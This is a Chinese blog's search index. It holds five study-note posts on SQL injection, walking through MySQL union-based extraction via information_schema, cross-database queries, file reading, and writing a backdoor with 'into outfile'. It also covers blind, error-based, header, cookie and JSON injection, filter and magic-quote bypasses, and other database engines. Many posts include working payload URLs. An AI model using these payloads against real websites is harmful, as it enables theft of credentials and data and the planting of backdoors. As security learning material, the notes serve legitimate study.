<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SQL注入--MYSQL数据库注入</title>
    <url>/2023/09/21/MYSQLinjection/</url>
    <content><![CDATA[<h2 id="SQL注入学习笔记（二）–MYSQL数据库注入之数据注入"><a href="#SQL注入学习笔记（二）–MYSQL数据库注入之数据注入" class="headerlink" title="SQL注入学习笔记（二）–MYSQL数据库注入之数据注入"></a>SQL注入学习笔记（二）–MYSQL数据库注入之数据注入</h2><h3 id="MYSQL数据库结构–注意！！！这是MYSQL数据库的注入"><a href="#MYSQL数据库结构–注意！！！这是MYSQL数据库的注入" class="headerlink" title="MYSQL数据库结构–注意！！！这是MYSQL数据库的注入"></a>MYSQL数据库结构–注意！！！这是MYSQL数据库的注入</h3><p>MYSQL数据库结构–step by step get 权限<br> 数据库A&#x3D;网站A(first step)&#x3D;数据库普通用户A(若为root最高权限用户，可实现跨库)<br>  表名(second)<br>   列名(third)<br>    数据(dourth)<br> 数据库B&#x3D;网站B&#x3D;数据库普通用户A<br>  表名<br>   列名<br>    数据<br> 数据库C&#x3D;网站C&#x3D;数据库普通用户A<br>  表名<br>   列名<br>    数据<br>数据库A&#x3D;网站A&#x3D;数据库用户A	——&gt;表名——&gt;列名——&gt;数据<br>数据库B&#x3D;网站B&#x3D;数据库用户B	——&gt;表名——&gt;列名——&gt;数据<br>数据库C&#x3D;网站C&#x3D;数据库用户C	——&gt;表名——&gt;列名——&gt;数据<br>备注：这样的好处一个用户对应一个库、这样网站之间的数据互不干扰，<br>当然这是最基础的数据库模型，现在大网站都是分布式数据库。</p>
<h3 id="信息收集–便于后期选择何种方式进行数据注入或者高权限注入"><a href="#信息收集–便于后期选择何种方式进行数据注入或者高权限注入" class="headerlink" title="信息收集–便于后期选择何种方式进行数据注入或者高权限注入"></a>信息收集–便于后期选择何种方式进行数据注入或者高权限注入</h3><p>数据库版本：version()–方便在进行下面的数据注入1时选择何种方式注入<br>数据库名字：database()–判断是否为高权限<br>数据库用户：user()–管理员<br>操作系统：@@version_compile_os–linux与Windows，哪个分大小写<br>其他(网站路径等)</p>
<h3 id="数据注入"><a href="#数据注入" class="headerlink" title="数据注入"></a>数据注入</h3><p>同数据库：<br>低版本（5.0以下）：暴力查询或结合读取查询<br>高版本（5.0以上）：information_schema有据查询</p>
<h3 id="MYSQL数据库数据注入流程"><a href="#MYSQL数据库数据注入流程" class="headerlink" title="MYSQL数据库数据注入流程"></a>MYSQL数据库数据注入流程</h3><p>1、判断注入<br>2、猜解列名数量（字段数）–order by number(报错的前一个就为列数，order by number中,number是以第number列为参考进行排序)。<br>3、报错猜解准备：<br>根据2得到的列数，</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">www</span>.xiaodi8.com/index.php?id=<span class="hljs-number">8</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>--为了看哪些参数能够显示在页面上。<br></code></pre></td></tr></table></figure>
<p>然后让他报错，即在网页页面仅仅显示一个数字(1，2，3，4的任一个),执行：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">www.xiaodi8.com/index.php?<span class="hljs-attribute">id</span>=-8 <span class="hljs-keyword">and</span> <span class="hljs-attribute">2</span>=222 union select 1,2,3,4;--and <span class="hljs-attribute">2</span>=222写不写无所谓。<br>(<span class="hljs-attribute">id</span>=-8 是为了让回显的结果为空执行后面union的字句。)<br></code></pre></td></tr></table></figure>
<p>4、信息收集：<br>由于3，为什么要报错：这样就可以在页面看到显示的那个数字，比如说在页面看到2、3，那就在2，3作为参数修改的位置。<br>然后执行：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">www</span>.xiaodi8.com/index.php?id=-<span class="hljs-number">8</span> and <span class="hljs-number">2</span>=<span class="hljs-number">222</span> union select <span class="hljs-number">1</span>,version(),database(),<span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure>
<p>这样可以收集到数据库以及版本信息(参数回显)。<br>然后，查询用户以及操作系统:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">www</span>.xiaodi8.com/index.php?id=-<span class="hljs-number">8</span> and <span class="hljs-number">2</span>=<span class="hljs-number">222</span> union select <span class="hljs-number">1</span>,user(),@@version_compile_os,<span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure>

<p>5、开搞：<br>(1)在mysql5.0以后的版本存在一个information_schema数据库、里面存储记录数据库名、表名、列名的数据库<br>相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名。<br>(2)在数据库中，”.”代表下一级，如xiaodi.user代表xiaodi数据库中的user表。<br>(3)相关表名：<br>information_schema.schemata    #记录所有数据库名的表<br>information_schema.tables			#记录所有表名信息的表<br>information_schema.columns		#记录所有列名信息的表<br>table_name										#表名<br>column_name										#列名<br>table_schema&#x2F;schema_name					#数据库名–table_schema是表tables和columns中的字段，schema_name是表schemata下的字段<br>(4)查询信息收集获取到的数据库名下(假设为mozhe)的所有表名信息</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">www.xiaodi8.com/<span class="hljs-keyword">index</span>.php?id=<span class="hljs-number">-8</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;mozhe&#x27;</span>;(<br>table_schema是<span class="hljs-keyword">tables</span>的一个字段，存储数据库名)<br></code></pre></td></tr></table></figure>
<p>(5)查询通过（4）获取到的表名（假设为color）下的所有列名信息（因为不知道这个表有什么）</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">www.xiaodi8.com/<span class="hljs-keyword">index</span>.php?id=<span class="hljs-number">-8</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;color&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p>(6)此时若获取到列名，id，name，password，现在查询指定数据</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">www.xiaodi8.com/<span class="hljs-keyword">index</span>.php?id=<span class="hljs-number">-8</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-type">name</span>,<span class="hljs-keyword">password</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> color;<br> 多个猜解：采用<span class="hljs-keyword">limit</span> x,<span class="hljs-number">1</span><span class="hljs-comment">--变动猜解</span><br></code></pre></td></tr></table></figure>
<h3 id="高权限注入"><a href="#高权限注入" class="headerlink" title="高权限注入"></a>高权限注入</h3><p>1、跨库查询(前提是需要高权限)：利用注入进行跨数据库查询.本来是一个数据库对应一个网站对应一个普通用户A，但是如果是root用户，<br>那么这个网站存在漏洞的话，会影响到其他数据库，这就是跨库注入。(就是数据库中ROOT权限高，能访问同数据库下其他网站的数据，<br>如果是普通用户会有权限限制)<br>简述流程：<br>(1)获取所有数据库名:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">www.xiaodi8.com/<span class="hljs-keyword">index</span>.php?id=<span class="hljs-number">-8</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">schema_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure>
<p>(2)获取指定数据库名qyysw下的表名:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">www.xiaodi8.com/<span class="hljs-keyword">index</span>.php?id=<span class="hljs-number">-8</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;qyysw&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p>(3)在指定数据库(qyysw)指定表名(admin)查询列名:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">schema_name</span>=<span class="hljs-string">&#x27;qyysw&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p>(4)在指定数据库的指定表查询数据：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,u,p,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> qyysw.<span class="hljs-keyword">admin</span>;(为什么这里要qyysw.<span class="hljs-keyword">admin</span>指定数据库，因为这里是跨库，而上面那里不是跨库<span class="hljs-comment">--即跨库查询的时候一定要指定数据库名)</span><br></code></pre></td></tr></table></figure>
<p>2、文件读取：利用注入进行文件读取或写入（前提：知道路径，获取管理员权限）<br>(1)MYSQL数据库内置的两个函数：<br>load_file						文件读取函数<br>into outfile 或into dumpfile		文件写入&#x2F;导出函数<br>(2)文件路径获取方法:报错显示(路径后乱打一通)、遗留文件(找phpinfo.php)、漏洞报错(搭建平台软件漏洞爆路径)、平台配置文件、爆破等。<br>(3)假设知道路径后：<br>读入：<br>?id&#x3D;-8 union select 1,load_file(‘d:\ww.txt’),3,4;(\是防转义,防止\被转换)<br>写入（后门）：<br>?id&#x3D;-8 union select 1,’x(要写入的代码)’,3,4 into outfile ‘D:\PYstart\x.php’ –+(查看网站源代码，若后面有其他SQL语句，注释掉后面的内容);</p>
<h4 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h4><p>关于文件读写，存在一个魔术引号的概念(存在于php5.3.4及其以下的版本)<br>  魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，对单引号、双引号、反斜线、NULL加上一个一个反斜线()进行转义，这个的作用跟addslashes()的作用完全相同，一定程度上防止了SQL注入。<br>绕过方法:<br>采用hex(16进制)编码绕过因为对路径进行编码之后魔术引号不会再对其生效也就是说绕过了魔术引号的作用达到绕过。<br>编码软件:winhex、小葵</p>
<h3 id="相关防注入"><a href="#相关防注入" class="headerlink" title="相关防注入"></a>相关防注入</h3><p>1、自带防御:魔术引号<br>2、内置函数：int()等<br>3、自定义关键字:select–可以通过大小写混合(Select)，双写(selselectect)绕过<br>4、WAF防护软件：安全狗、宝塔等<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=12&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">跨库注入演示：15：00处</a><br><a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">文件读取是有讲究的:读取敏感信息</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入--除MYSQL数据库(如mongoDB,oracle等)的注入</title>
    <url>/2023/09/23/SQLinjectFourth/</url>
    <content><![CDATA[<h2 id="SQL注入学习笔记（四）–除MYSQL数据库-如mongoDB-oracle等-的注入"><a href="#SQL注入学习笔记（四）–除MYSQL数据库-如mongoDB-oracle等-的注入" class="headerlink" title="SQL注入学习笔记（四）–除MYSQL数据库(如mongoDB,oracle等)的注入"></a>SQL注入学习笔记（四）–除MYSQL数据库(如mongoDB,oracle等)的注入</h2><figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada">除了<span class="hljs-keyword">Access</span>外,其他数据库类型结构均与MYSQL结构相差不大,只是相关注入语句不同。<br>可以用一些工具判断数据库的类型,如SQLmap，kali等。<br></code></pre></td></tr></table></figure>
<h3 id="ACCESS注入"><a href="#ACCESS注入" class="headerlink" title="ACCESS注入"></a>ACCESS注入</h3><p>1、Access数据库结构(单库,不存在跨库)<br>表名<br>列名<br>数据<br>2、access 数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库<br>Access扁移注入:<br>解决列名获取不到的情况<br>查看登陆框源代码的表单值或观察URL特征等也可以针对表或列获取不到的情况</p>
<h4 id="access三大攻击手法"><a href="#access三大攻击手法" class="headerlink" title="access三大攻击手法"></a>access三大攻击手法</h4><p>1.access注入攻击片段-联合查询法<br>2.access注入攻击片段-逐字猜解法<br>3.工具类的使用注入（推荐）</p>
<h4 id="Access注入攻击方式"><a href="#Access注入攻击方式" class="headerlink" title="Access注入攻击方式"></a>Access注入攻击方式</h4><p>union 注入、http header 注入、偏移注入等<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=14&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Access数据库注入演示:31:00</a></p>
<h3 id="mssql注入"><a href="#mssql注入" class="headerlink" title="mssql注入"></a>mssql注入</h3><p>mssql特有的系统表：sysobjects<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=14&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">mssal(SQLserver)数据库注入演示:41:00</a></p>
<h3 id="postgresql注入"><a href="#postgresql注入" class="headerlink" title="postgresql注入"></a>postgresql注入</h3><p><a href="https://www.yuque.com/weiker/xiaodi/us54cb">各种注入工具(如sqlmap)的使用</a></p>
<h3 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=14&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Oracle数据库注入演示:1:23:00</a></p>
<h3 id="mongoDB注入"><a href="#mongoDB注入" class="headerlink" title="mongoDB注入"></a>mongoDB注入</h3><p>1、mongoDB是非关系型数据库。<br>2、与其他数据库查询语法不同,要上网查资料。<br>3、且SQLmap识别不了(SQLmap支持关系型数据库),得换其他工具(如nosqlattack)。<br><a href="https://github.com/youngyangyang04/NoSQLAttack">nosqlattack下载:</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=14&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">mongoDB数据库注入演示:1:29:00</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入--查询方式、报错盲注、二次、加解密以及DNSlog等注入</title>
    <url>/2023/09/24/SQLinjectionFifth/</url>
    <content><![CDATA[<h2 id="SQL注入学习笔记（五）–查询方式、报错盲注、二次、加解密以及DNSlog等注入"><a href="#SQL注入学习笔记（五）–查询方式、报错盲注、二次、加解密以及DNSlog等注入" class="headerlink" title="SQL注入学习笔记（五）–查询方式、报错盲注、二次、加解密以及DNSlog等注入"></a>SQL注入学习笔记（五）–查询方式、报错盲注、二次、加解密以及DNSlog等注入</h2><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">拿到一个网站,先判断其最可能是何种查询方式,再判断其有无回显,最后选择注入方式。<br></code></pre></td></tr></table></figure>
<p>当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式(如增删改)的问题<br>导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大<br>概写法也能更好的选择对应的注入语句。(有时候select语句的执行结果也无回显,仅仅是对select的结果进行判断<br>,然后返回的东西不涉及真实数据。)</p>
<h3 id="SQL语句盲注"><a href="#SQL语句盲注" class="headerlink" title="SQL语句盲注"></a>SQL语句盲注</h3><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，<br>这个过程称之为盲注。我们可以知道盲注分为以下三类:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>、基于布尔的<span class="hljs-keyword">sQL</span>盲注<span class="hljs-operator">-</span>逻辑判断 regexp, <span class="hljs-keyword">like</span> , ascii,<span class="hljs-keyword">left</span>, ord , mid<br><span class="hljs-number">2</span>、基于时间的<span class="hljs-keyword">sQL</span>盲注<span class="hljs-operator">-</span>延时判断 if ,sleep<br><span class="hljs-number">3</span>、基于报错的<span class="hljs-keyword">sQL</span>盲注<span class="hljs-operator">-</span>报错回显(强制回显) floor, updatexml, extractvalue <br><span class="hljs-comment">--先强制报错,不行再逻辑判断,最后延时判断。</span><br></code></pre></td></tr></table></figure>
<p><a href="https://www.jianshu.com/p/bc35f8dd4f7c">报错回显常见函数解析以及相关使用方法</a></p>
<h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">username<span class="hljs-operator">=</span>xiaodi&#x27;<span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat(<span class="hljs-number">0x7e</span><span class="hljs-punctuation">,</span>version()<span class="hljs-punctuation">,</span><span class="hljs-number">0x7e</span>)<span class="hljs-punctuation">,</span><span class="hljs-number">0</span>) <span class="hljs-keyword">or</span>&#x27;&amp;password<span class="hljs-operator">=</span><span class="hljs-number">123456</span>&amp;sex<span class="hljs-operator">=</span>man&amp;phonenum<span class="hljs-operator">=</span><span class="hljs-number">138</span>&amp;email<span class="hljs-operator">=</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%9</span>B<span class="hljs-variable">%E5</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%9</span>D&amp;<span class="hljs-keyword">add</span><span class="hljs-operator">=</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%90</span><span class="hljs-variable">%E9</span><span class="hljs-variable">%83</span><span class="hljs-variable">%BD</span>&amp;submit<span class="hljs-operator">=</span>submit<br></code></pre></td></tr></table></figure>
<p>注意：将注入语句放在语句的其他位置(如email等)是可以的,注意看网站提交的数据。</p>
<h3 id="时间盲注-if-sleep"><a href="#时间盲注-if-sleep" class="headerlink" title="时间盲注(if+sleep)"></a>时间盲注(if+sleep)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from member <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1 and <span class="hljs-built_in">sleep</span>(<span class="hljs-keyword">if</span>(database()=<span class="hljs-string">&#x27;pikachu&#x27;</span>,5,0));<br>Empty <span class="hljs-built_in">set</span> (5.00 sec)<br>语句的意思就是如果数据是pikachu就延迟5秒输出，不是的话就立即返回，但是在实际渗透过程中由于受到网络的影响时间注入不是很靠谱。<br><span class="hljs-built_in">limit</span> 0,1 <span class="hljs-comment">#表示从第一行开始取一行</span><br></code></pre></td></tr></table></figure>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">布尔（<span class="hljs-type">Boolean</span>）型是计算机里的一种数据类型，只有<span class="hljs-literal">True</span>（真）和<span class="hljs-literal">False</span>（假）两个值。一般也称为逻辑型。<br> 页面在执行<span class="hljs-keyword">sql</span>语句后，只显示两种结果，这时可通过构造逻辑表达式的<span class="hljs-keyword">sql</span>语句来判断数据的具体内容。<br></code></pre></td></tr></table></figure>
<figure class="highlight makefile"><table><tr><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">注意:盲注时,先判断数据库名字长度,再一位一位截取。</span><br></code></pre></td></tr></table></figure>
<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>加解密注入:先要把语句写好，再做同种加密。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=16&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">加解密注入演示:3:00</a><br>二次注入:一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。(一般这种漏洞存在于代码审计)<br>比如搜索框、输入框、注册框、更改密码框里面写入语句，然后页面将数据带到数据库进行拼接，形成sql二次注入。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=16&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">二次注入演示:28:00</a><br>DNSlog注入:使用DnsLog盲注仅限于windos环境。,且拥有高权限(如文件读取)。<br>DNSlog:解决了盲注不能回显数据、效率低的问题。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=16&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">DNSlog注入演示:48:00</a><br>中转注入:自己写脚本放入sqlmap内的tamper(插件库)内,然后使用sqlmap注入时调用,碰到没有插件可以用中转注入。<br>(自己手写代码,利用sqlmap注入,以后可以自己开发些网上没有的插件,辅助自己注入)<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=16&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">中转注入演示:1:00:00</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入--类型以及提交注入</title>
    <url>/2023/09/22/SQLinjectThird/</url>
    <content><![CDATA[<h2 id="SQL注入学习笔记（三）–类型以及提交注入"><a href="#SQL注入学习笔记（三）–类型以及提交注入" class="headerlink" title="SQL注入学习笔记（三）–类型以及提交注入"></a>SQL注入学习笔记（三）–类型以及提交注入</h2><h3 id="参数类型以及请求方法"><a href="#参数类型以及请求方法" class="headerlink" title="参数类型以及请求方法"></a>参数类型以及请求方法</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">#简要明确参数类型<br>数字，字符，搜索，<span class="hljs-type">JsoN</span>等<br>#简要明确请求(提交)方法<br><span class="hljs-number">1</span>、<span class="hljs-keyword">GET</span>, POST,COOKIE(不是请求方法，仅仅是数据包内的东西)，REQUEST，HTTP头部注入(<span class="hljs-keyword">User</span>-Agent注入、Referer注入)等<span class="hljs-comment">--这几种都存在注入。</span><br>大数据、重要数据、表单用post提交;小数据用<span class="hljs-keyword">get</span>提交;request全部(<span class="hljs-keyword">GET</span>,POST)接收。<br><span class="hljs-number">2</span>、其中<span class="hljs-keyword">sql</span>语句干扰符号: <span class="hljs-string">&#x27;,&quot;,s,),&#125;等，具体需看写法,自己尝试。</span><br><span class="hljs-string">3、对方采取什么方式提交数据，那么你就应该采取那种方式注入。</span><br><span class="hljs-string">4、$_SERVER(&#x27;</span>HTTP_USER_AGENT<span class="hljs-string">&#x27;),获取对方网站硬件配置(如操作系统)信息--拓展原有注入思路，在原有数据包进行注入(HTTP头部注入)。</span><br></code></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=13&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">请求方法讲解以及此类注入演示:17:00处</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=13&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">猜某网站是何种请求方法:35:00处</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=13&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">各种注入方法以及靶场位置(供自己练习–burp+watefox):44:00</a></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">学习中遇到的问题:<br>1、有时候在?<span class="hljs-attribute">id</span>=1后面输入and <span class="hljs-attribute">1</span>=1或and <span class="hljs-attribute">1</span>=2返回的页面无任何区别。<br>答：这是由于1可能是字符，你可以在<span class="hljs-keyword">and</span>前加一个单引号，把这一块闭合：<span class="hljs-string">&#x27; and 1=1--+(有时候这个注释符要换成#)。</span><br><span class="hljs-string">    get用--+，post用#。</span><br><span class="hljs-string">    也可以不注释，&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1。</span><br><span class="hljs-string">2、若无回显，那么就是盲注。</span><br><span class="hljs-string">3、有时候不一定要闭合&#x27;</span>，还有可能,<span class="hljs-string">&quot;,s,),&#125;等，具体需看写法,自己尝试。</span><br><span class="hljs-string">4、post类型的注入通常产生在登陆界面，先考虑两个问题:提交方式以及参数类型。</span><br><span class="hljs-string">5、当使用post提交数据时，若搞来搞去没任何反应，这时候就应该是对post过滤了，可以尝试get或cookie注入。</span><br><span class="hljs-string">6、json的文件格式(APP常见)：</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">   &quot;</span>user<span class="hljs-string">&quot;:&quot;</span>xiaodi <span class="hljs-string">&#x27;and 1=1&quot;//闭不闭合,是看SQL语句的,若SQL语句默认用&#x27;</span><span class="hljs-string">&#x27;接受这个JSON文件(例如数据是字符),那么要闭合。</span><br><span class="hljs-string">   &quot;password&quot;:&quot;xiaodi&quot;//SQL的闭合是要闭合后端代码，这个双引号是前端json的格式。</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">注入的时候要注意注入的格式(其实就是格式不同而已)，保证注入语句成功带入数据库执行。</span><br></code></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=13&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">cookie注入演示:1:20:00处</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=13&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Json文件相关介绍以及此类型的注入:1:41:00处</a></p>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><figure class="highlight vbnet"><table><tr><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">eg:</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user <span class="hljs-keyword">where</span> name=xiaodi<br>注入语句是:在xiaodi后加上 <span class="hljs-comment">&#x27; and 1=1 --+(# 只针对MYSQL)</span><br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>初步理解SQL注入(二)</title>
    <url>/2023/09/16/SQLzhuru/</url>
    <content><![CDATA[<h2 id="初步理解SQL注入-二"><a href="#初步理解SQL注入-二" class="headerlink" title="初步理解SQL注入(二)"></a>初步理解SQL注入(二)</h2><h3 id="单引号”-‘-“的作用"><a href="#单引号”-‘-“的作用" class="headerlink" title="单引号” ‘ “的作用"></a>单引号” ‘ “的作用</h3><p>   主要是为了匹配SQL语句中的id&#x3D;&#x3D;’ ** ‘，如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> xx <span class="hljs-keyword">from</span> xx <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27; 1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--+(或 #) &#x27; //返回此数据库中全部if中含1的数据</span><br><span class="hljs-keyword">select</span> xx <span class="hljs-keyword">from</span> xx <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27; 1&#x27;</span> (<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>) <span class="hljs-comment">--+(或#) &#x27; //仅返回1条，--+(或 #)是注释的意思。</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>如果不注释，页面虽然也会报错，但是仅仅是<span class="hljs-keyword">SQL</span>语句执行错误的报错。而不是发现有<span class="hljs-keyword">SQL</span>注入的错误提示。<br></code></pre></td></tr></table></figure>

<h3 id="and判断与or判断的区别"><a href="#and判断与or判断的区别" class="headerlink" title="and判断与or判断的区别"></a>and判断与or判断的区别</h3><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.and判断<br>  <span class="hljs-attribute">http</span>://www.xxx.com/xxx.asp?id=<span class="hljs-number">1</span>’and <span class="hljs-number">1</span>=<span class="hljs-number">1</span>这个条件是永真的，所以返回是正常页<br>  <span class="hljs-attribute">http</span>://www.xxx.com/xxx.asp?id=<span class="hljs-number">1</span>’and <span class="hljs-number">1</span>=<span class="hljs-number">2</span>如果报错那说明存在注入漏洞。<br><br><span class="hljs-attribute">2</span>.or判断<br>  <span class="hljs-attribute">or</span>跟and判断方法不一样的，and是提交返回错误才有注入点，而or是提交返回正确有注入点<br>  <span class="hljs-attribute">http</span>://www.xxx.com/xxx.asp?id=<span class="hljs-number">1</span>’or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br>  <span class="hljs-attribute">http</span>://www.xxx.com/xxx.asp?id=<span class="hljs-number">1</span>’or <span class="hljs-number">1</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

